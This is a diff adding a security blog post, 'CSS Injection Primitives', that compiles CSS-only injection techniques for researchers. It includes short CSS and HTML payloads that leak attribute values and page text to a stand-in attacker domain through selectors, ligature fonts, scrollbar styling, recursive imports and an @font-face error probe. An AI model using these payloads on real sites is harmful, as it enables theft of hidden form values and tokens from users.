@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CSS Injection Primitives | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="CSS Injection Primitives" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Collection of CSS / HTML primitives. Tricks to use as an alternative to JavaScript (exfiltration, timing, etc.)" />
+<meta property="og:description" content="Collection of CSS / HTML primitives. Tricks to use as an alternative to JavaScript (exfiltration, timing, etc.)" />
+<link rel="canonical" href="http://localhost:4000/posts/2019/10/16/CSS-Injection-Primitives.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2019/10/16/CSS-Injection-Primitives.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-10-16T03:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CSS Injection Primitives" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2019-10-16T03:00:00+02:00","datePublished":"2019-10-16T03:00:00+02:00","description":"Collection of CSS / HTML primitives. Tricks to use as an alternative to JavaScript (exfiltration, timing, etc.)","headline":"CSS Injection Primitives","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2019/10/16/CSS-Injection-Primitives.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2019/10/16/CSS-Injection-Primitives.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>16 October 2019</small>
+<h1>CSS Injection Primitives</h1>
+
+
+<p>        
+<strong>Last Update:</strong> 2019-12-04</p>
+
+<p>        
+The intention of this post is to document techniques and tricks that can be used as an alternative to JavaScript in the context of an injection. It is just a recopilation that I will be updating every few months (or at least I gonna try it…). Maybe this kind of recopilation is not useful for the majority of the mortals but I find interesting to “preserve” this information all together. All of them are well-known techniques, nothing fancy here. If you know more primitives please ping me at twitter (<a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>) so I can add them.</p>
+
+<h2 id="exfiltration-and-ping-back">Exfiltration and ping back</h2>
+<p>        
+<strong>Reference:</strong> <a href="https://github.com/cure53/HTTPLeaks/blob/master/leak.html">HTTP Leaks</a></p>
+
+<p>        
+In order to exfiltrate information we can rely on any of the well-known features that trigger an HTTP request to a server controlled by us. Specially we are intersted in those that are CSS related (@import, background, etc.). This will be the keystone to the rest of the tricks.</p>
+
+<h2 id="html-attribute-exfiltration">HTML attribute exfiltration</h2>
+<p>        
+<strong>Reference:</strong> <a href="https://slideplayer.com/slide/3493669/">The Sexy Assassin Tactical Exploitation using CSS</a>, <a href="https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d">Exfiltration via CSS Injection</a></p>
+
+<p>        
+Probably this is the most known attack. It is posible to build an oracle that leaks the value of an attribute via <a href="https://www.w3.org/TR/selectors-3/#attribute-selectors">CSS Selectors</a>. CSS Selectors can be used as an expresion to match an element if that element has an attribute that matches the attribute represented by the attribute selector. The selectors can be used to match a substring inside an attribute, à la regex, so we can abuse this feature in a boolean way to find the value of a target attribute.</p>
+
+<p>As an example, if we have something like <code class="language-plaintext highlighter-rouge">&lt;input value="somevalue" type="text"&gt;</code>, we can do something like:</p>
+
+<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">input</span><span class="o">[</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"a"</span><span class="o">]</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span> <span class="sx">url('http://ourdomain.com/?char1=a')</span><span class="p">;</span> <span class="p">}</span>
+<span class="nt">input</span><span class="o">[</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"b"</span><span class="o">]</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span> <span class="sx">url('http://ourdomain.com/?char1=b')</span><span class="p">;</span> <span class="p">}</span>
+<span class="o">...</span>
+<span class="nt">input</span><span class="o">[</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"s"</span><span class="o">]</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span> <span class="sx">url('http://ourdomain.com/?char1=s')</span><span class="p">;</span> <span class="p">}</span> <span class="o">//</span> <span class="nt">This</span> <span class="nt">will</span> <span class="nt">trigger</span> <span class="nt">a</span> <span class="nt">HTTP</span> <span class="nt">request</span> <span class="nt">to</span> <span class="nt">our</span> <span class="nt">endpoint</span>
+<span class="o">...</span>
+<span class="nt">input</span><span class="o">[</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"z"</span><span class="o">]</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span> <span class="sx">url('http://ourdomain.com/?char1=z')</span><span class="p">;</span> <span class="p">}</span>
+</code></pre></div></div>
+<p>        
+The <strong>value^=X</strong> expresion matches any element that contains an attribute “value” which <em>value</em> starts with the prefix <strong>X</strong>. So when all the CSS rules are evaluted, the selector <strong>value^=”s”</strong> will match our target element and trigger the HTTP request to our endpoint, leaking the first char. Then we need to repeat the process with <strong>value^=sX</strong> to extract the second char, then <strong>value^=soX</strong> and so on. This can be improved significally if we determine the charset first. In this example only the chars “s,o,m,e,v,a,l,u,e” are used ( 9 vs the size of the whole potential charset) so we can reduce the number of “rules” needed in order to leak the whole string. This can be accomplished via <strong>value*=X</strong>, where <strong>X</strong> matches any string which contains <strong>X</strong>. Pregenerate selectors that matches all the whole potential charset, then reuse only the ones that matched.</p>
+
+<p>        
+Usually the juicy information is inside inputs elements of type <strong>hidden</strong>. This kind of elements are not rendered by the browser, so (most)browsers no need to retrieve external resources for the element (which is the method used by us to leak the info). This problem can be solved with <a href="https://www.w3.org/TR/selectors-3/#combinators">CSS combinators</a>.</p>
+
+<p>        
+Using the subsequent-sibling combinator (<strong>~</strong>) it is possible to represent the elements between two selectors. This way we can craft a rule like <code class="language-plaintext highlighter-rouge">input[value^=a] ~ *</code> that can be translated (roughly) as “elements that are between an input with a value that starts with “a” and anything that share the same parent”.</p>
+
+<p>        
+To perform this attack we need to update the ruleset to match the next char in each iteration. A shabby approach can be the use of <code class="language-plaintext highlighter-rouge">&lt;meta-refresh...&gt;</code>. A better idea can be the combination of this attack with CSS import recursion (this technique will be discussed later).</p>
+
+<h2 id="text-node-exfiltration-i-ligatures">Text node exfiltration (I): ligatures</h2>
+<p>        
+<strong>Reference:</strong> <a href="https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/">Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację</a></p>
+
+<p>        
+We can extract the text contained in a node with a technique that combines font ligatures and the detection of width changes. The main idea behind this technique is the creation of fonts that contains a predefined ligature with high size and the usage of size changes as oracle.</p>
+
+<p>        
+The fonts can be created as SVG fonts and then converted to woff with fontforge. In SVG we can define the width of a glyph via <strong>horiz-adv-x</strong> attribute, so we can build something like <code class="language-plaintext highlighter-rouge">&lt;glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/&gt;</code>, being XY a sequence of two chars. If the sequence exists, it will be rendered and the size of the text will change. But… how can we detect these changes?</p>
+
+<p>        
+When the attribute white-space is defined as <strong>nowrap</strong> it forces the text to do not break when it exceeds the parent’s width. In this situation, an horizontal scrollbar will appear. And we can define the style of that scrollbar, so we can leak when this happens <strong>:)</strong></p>
+
+<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">body</span> <span class="p">{</span> <span class="nl">white-space</span><span class="p">:</span> <span class="nb">nowrap</span> <span class="p">}</span><span class="o">;</span> 
+<span class="nt">body</span><span class="nd">::-webkit-scrollbar</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span> <span class="no">blue</span><span class="p">;</span> <span class="p">}</span>
+<span class="nt">body</span><span class="nd">::-webkit-scrollbar:horizontal</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span> <span class="sx">url(http://ourendpoint.com/?leak)</span><span class="p">;</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>        
+At this point the attack is clear:</p>
+<ol>
+  <li>Create fonts for the combination of two chars with huge width</li>
+  <li>Detect the leak via the scrollbar trick</li>
+  <li>Using the first ligature leaked as base, create new combinations of 3 chars (adding before / after chars)</li>
+  <li>Detect the 3-chars ligature.</li>
+  <li>Repeat until leaking the whole text</li>
+</ol>
+
+<p>        
+We still needing a improved method to start the iteration because <code class="language-plaintext highlighter-rouge">&lt;meta refresh=...</code> is suboptimal. CSS recursive imports is our savior!</p>
+
+<h2 id="css-recursive-import">CSS Recursive import</h2>
+<p>        
+<strong>Reference:</strong> <a href="https://github.com/cgvwzq/css-scrollbar-attack/">PoC for leaking text nodes via CSS injection by @cgvwzq</a></p>
+
+<p>        
+To avoid hardcoding all the steps in the payload (that would be overkill) -or using limited tricks like meta-refresh / iframes- we can use CSS recursive imports. In CSS we can import more rules from external style sheets with the <code class="language-plaintext highlighter-rouge">@import</code> CSS at-rule. Browsers will try to reach the external resource to get the CSS rules and apply them to format the website. But… what happens when the request to the external style sheet takes too long? That the browser processes the rules settled in the main CSS and when it manages to load the external style sheet those rules will be applied.</p>
+
+<p>        
+This behaviour can be abused in order to generate custom CSS rules on the fly. In our injection we can use an import to a style sheet hosted in our server, and this CSS will contain an import to another CSS owned by us plus the rules to leak the first chars (in attributes or in text nodes). The server response to the import will be delayed until we got the leaked char. When we known the first char we can build the custom CSS rules needed to leak the next char and deliver the file (the file will contain another import too, so we can repeat again the process).</p>
+
+<h2 id="error-based-xs-search-alternative-to-onerror">Error-based XS-Search (alternative to onerror)</h2>
+<p>        
+<strong>Reference:</strong> <a href="https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html">CSS based Attack: Abusing unicode-range of @font-face </a>, <a href="https://twitter.com/terjanq/status/1180477124861407234">Error-Based XS-Search PoC by @terjanq</a></p>
+
+<p>        
+This trick is an alternative to onerror. Basically the main idea is to use a custom font from an endpoint controlled by us in an text that will be showed only if the resource can not be loaded.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;style&gt;</span>
+    <span class="k">@font-face</span><span class="p">{</span>
+        <span class="nl">font-family</span><span class="p">:</span> <span class="n">poc</span><span class="p">;</span> 
+        <span class="nl">src</span><span class="p">:</span> <span class="sx">url(http://ourenpoint.com/?leak)</span><span class="p">;</span> 
+        <span class="py">unicode-range</span><span class="p">:</span><span class="n">U</span><span class="err">+</span><span class="m">0041</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nf">#poc0</span><span class="p">{</span>
+        <span class="nl">font-family</span><span class="p">:</span> <span class="s2">'poc'</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+
+<span class="nt">&lt;object</span> <span class="na">id=</span><span class="s">"poc0"</span> <span class="na">data=</span><span class="s">"http://192.168.0.1/favicon.ico"</span><span class="nt">&gt;</span>A<span class="nt">&lt;/object&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>        
+We can abuse this technique for example to build a network scanner (to scan webs hosted in the internal network, even fingerprint well-known web platforms).</p>
+
+<h2 id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font">Text node exfiltration (II): leaking the charset with a default font</h2>
+<p>        
+<strong>Reference:</strong> <a href="https://demo.vwzq.net/css2.html">PoC using Comic Sans by @Cgvwzq &amp; @Terjanq</a></p>
+
+<p>        
+This trick was released in this <a href="https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/">Slackers thread</a>. The charset used in a text node can be leaked using the default fonts intalled in the browser: no external -or custom- fonts are needed. The PoC linked as reference is well commented, so we are just going to highlight some points in a human-readable way <strong>;-)</strong>.</p>
+
+<p>        
+The key is to use an animation to grow the div width from 0 to the end of the text, the size of a char each time. Doing this we can “split” the text in two parts: a “prefix” (the first line) and a “suffix”, so every time the div increases its width a new char moves from the “suffix” to the “prefix”. Something like:</p>
+
+<p><strong>C</strong><br />ADB</p>
+
+<p><strong>CA</strong><br />DB</p>
+
+<p><strong>CAD</strong><br />B</p>
+
+<p><strong>CADB</strong></p>
+
+<p>        
+When a new char goes to the first line, the unicode-range trick is used to detect the new character in the prefix. This detection is made changing the font to Comic Sans, which its heigth is superior so a vertical scrollbar is triggered (leaking the char value). This way we can leak every different character one time. <strong>We can detect if a character is repated but not what character is repeated</strong>.</p>
+
+<h2 id="final-words">Final words</h2>
+<p>        
+As I said before I want to keep this collection updated. If you know more tricks, please feel free to ping me at twitter (<a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>) so I can add them to the list.</p>
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
